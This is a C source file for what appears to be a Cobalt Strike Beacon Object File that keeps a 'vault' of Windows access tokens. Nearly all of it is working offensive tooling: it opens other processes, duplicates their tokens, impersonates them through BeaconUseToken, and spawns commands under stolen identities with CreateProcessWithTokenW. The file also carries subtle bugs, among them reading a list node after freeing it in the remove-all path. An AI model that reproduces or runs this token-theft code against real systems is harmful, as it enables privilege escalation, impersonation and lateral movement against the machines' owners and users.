#include <stdint.h>
#include <windows.h>
#include "beacon.h"

// clang-format off
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);
DECLSPEC_IMPORT void* WINAPI MSVCRT$memset(void*, int, size_t);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
// clang-format on

#define MAX_NAME 256
//#define LOGON_WITH_PROFILE 1
//#define LOGON_NETCREDENTIALS_ONLY 2

#define CMD_CREATE 1
#define CMD_STEAL 2
#define CMD_SHOW 3
#define CMD_USE 4
#define CMD_REMOVE 5
#define CMD_REMOVE_ALL 6
#define CMD_SPAWN 7

struct vault_item {
    HANDLE token;
    DWORD pid;
    char username[MAX_NAME];
    char domain[MAX_NAME];
    struct vault_item *next;
};

struct vault {
    struct vault_item *head;
};

struct vault *vault_create() {
    struct vault *vault = (struct vault *)MSVCRT$malloc(sizeof(struct vault));
    vault->head = NULL;
    return vault;
}

struct vault_item *vault_insert(struct vault *vault, HANDLE handle, DWORD pid) {
    struct vault_item *item = (struct vault_item *)MSVCRT$malloc(sizeof(struct vault_item));
    item->token = handle;
    item->pid = pid;
    item->username[0] = '\0';
    item->domain[0] = '\0';
    item->next = vault->head;
    vault->head = item;
    return item;
}

struct vault_item **find_inderect(struct vault *vault, DWORD pid) {
    struct vault_item **p = &vault->head;
    while (*p && (*p)->pid != pid)
        p = &(*p)->next;
    return p;
}

struct vault_item *vault_find(struct vault *vault, DWORD pid) {
    return *find_inderect(vault, pid);
}

void vault_remove(struct vault *vault, DWORD pid) {
    struct vault_item **item = find_inderect(vault, pid);
    if (*item) {
        struct vault_item *tmp = *item;
        KERNEL32$CloseHandle(tmp->token);
        *item = tmp->next;
        MSVCRT$free(tmp);
    }
}

size_t vault_count(struct vault *vault) {
    struct vault_item *i = vault->head;
    size_t count = 0;
    while (i) {
        ++count;
        i = i->next;
    }
    return count;
}

BOOL steal_token(DWORD pid, PHANDLE hTarget) {
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!hProcess) {
        return FALSE;
    }
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        KERNEL32$CloseHandle(hProcess);
        return FALSE;
    }
    // clang-format off
    BOOL result = ADVAPI32$DuplicateTokenEx(hToken,
                                            TOKEN_ADJUST_DEFAULT |
                                            TOKEN_ADJUST_SESSIONID |
                                            TOKEN_QUERY |
                                            TOKEN_DUPLICATE |
                                            TOKEN_ASSIGN_PRIMARY,
                                            NULL,
                                            SecurityImpersonation, TokenPrimary, hTarget);
    // clang-format on
    KERNEL32$CloseHandle(hProcess);
    return result;
}

void get_username(HANDLE token, struct vault_item *item) {
    PTOKEN_USER user;
    DWORD out;
    ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &out);
    user = (PTOKEN_USER)MSVCRT$malloc(out);
    if (ADVAPI32$GetTokenInformation(token, TokenUser, user, out, &out)) {
        DWORD uSize = MAX_NAME;
        DWORD dSize = MAX_NAME;
        SID_NAME_USE sidType;
        if (!ADVAPI32$LookupAccountSidA(NULL, user->User.Sid, item->username, &uSize, item->domain, &dSize, &sidType)) {
            item->username[0] = '\0';
            item->domain[0] = '\0';
        }
    }
    MSVCRT$free(user);
    return;
}

struct vault_item *action_steal_token(struct vault *vault, WORD pid) {
    HANDLE token;
    if (steal_token(pid, &token)) {
        struct vault_item *item = vault_insert(vault, token, pid);
        get_username(token, item);
        BeaconPrintf(CALLBACK_OUTPUT, "%i: %s\\%s", item->pid, item->domain, item->username);
        return item;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Error: %i: %i", pid, KERNEL32$GetLastError());
    }
    return NULL;
}

struct vault *BeaconDataVault(datap *parser) {
    // BeaconDataInt reads only 4-byte integer
    // Combine the address from two int
    uint64_t a1, a2;
    a1 = (unsigned int) BeaconDataInt(parser);
    a2 = (unsigned int) BeaconDataInt(parser);
    return (struct vault *)(a1 + (a2 << 32));
}

BOOL spawn_process(HANDLE token, DWORD logonType, wchar_t cmdline[]) {
    //Init structs

    STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInformation;
    
    MSVCRT$memset(&startupInfo, 0, sizeof(STARTUPINFOW));
	MSVCRT$memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));

    startupInfo.cb = sizeof(STARTUPINFOW);	

    BeaconPrintf(CALLBACK_OUTPUT, "Trying to start process of type %d with cmd: %ls \n", logonType, cmdline);

    // Returns value if success
    BOOL status = ADVAPI32$CreateProcessWithTokenW(token, logonType, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);

    return status;
}

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int cmd = BeaconDataInt(&parser);
    // BeaconPrintf(CALLBACK_OUTPUT, "Command: %i %i", len, cmd);

    if (cmd == CMD_CREATE) {
        struct vault *vault = vault_create();
        BeaconPrintf(CALLBACK_OUTPUT, "token vault created: %p", vault);
    } else if (cmd == CMD_STEAL) {
        struct vault *vault = BeaconDataVault(&parser);
        int pid_count = BeaconDataInt(&parser);
        for (int i = 0; i < pid_count; ++i) {
            WORD pid = BeaconDataShort(&parser);
            action_steal_token(vault, pid);
        }
    } else if (cmd == CMD_SHOW) {
        struct vault *vault = BeaconDataVault(&parser);
        size_t items = vault_count(vault);
        formatp obj;
        BeaconFormatAlloc(&obj, items * (MAX_NAME + MAX_NAME + 16));

        struct vault_item *item = vault->head;
        while (item) {

            BeaconFormatPrintf(&obj, "%i: %s\\%s\n", item->pid, item->domain, item->username);
            item = item->next;
        }

        int len;
        char *data = BeaconFormatToString(&obj, &len);
        BeaconOutput(CALLBACK_OUTPUT, data, len);
        BeaconFormatFree(&obj);
    } else if (cmd == CMD_USE) {
        struct vault *vault = BeaconDataVault(&parser);
        WORD pid = BeaconDataShort(&parser);
        struct vault_item *item = vault_find(vault, pid);
        if (item) {
            BeaconUseToken(item->token);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "token of %i not in the vault; try to get it.", pid);
            item = action_steal_token(vault, pid);
            if (item) {
                BeaconUseToken(item->token);
            }
        }
    } else if (cmd == CMD_REMOVE) {
        struct vault *vault = BeaconDataVault(&parser);
        WORD pid = BeaconDataShort(&parser);
        vault_remove(vault, pid);
        BeaconPrintf(CALLBACK_OUTPUT, "removed: %i", pid);
    } else if (cmd == CMD_REMOVE_ALL) {
        struct vault *vault = BeaconDataVault(&parser);
        size_t items = vault_count(vault);
        formatp obj;
        BeaconFormatAlloc(&obj, items * 32);

        struct vault_item *item = vault->head;
        while (item) {
            BeaconFormatPrintf(&obj, "removed: %i\n", item->pid);
            vault_remove(vault, item->pid);
            item = item->next;
        }

        int len;
        char *data = BeaconFormatToString(&obj, &len);
        BeaconOutput(CALLBACK_OUTPUT, data, len);
        BeaconFormatFree(&obj);
    } else if (cmd == CMD_SPAWN) {
        // (i) + ii + s + s + z
        struct vault *vault = BeaconDataVault(&parser);
        WORD pid = BeaconDataShort(&parser);
        WORD logon = BeaconDataShort(&parser);

        // I swear I've seen a BOF use wchar_t directly since pack allows for Z, but the extract func returns char* so wth?
        char* cmdstr = BeaconDataExtract(&parser, NULL);
        wchar_t cmd[MAX_NAME] = {0};
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, cmdstr, -1, cmd, MAX_NAME);
        //toWideChar(cmdstr, cmd, MAX_NAME); This function doesn't seem to work, not sure why

        // Get handle
        BOOL status;
        struct vault_item *item = vault_find(vault, pid);
        if (item) {

            status = spawn_process(item->token, logon, cmd);

            if (status) {       
                BeaconPrintf(CALLBACK_OUTPUT, "Successfully started process with cmd: %s\n", cmdstr);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "Unable to start process with cmd: %s\n", cmdstr);
            }

        } else {
            BeaconPrintf(CALLBACK_ERROR, "token of %i not in the vault; select or steal a valid token.\n", pid);
            
        }

        
    }
}
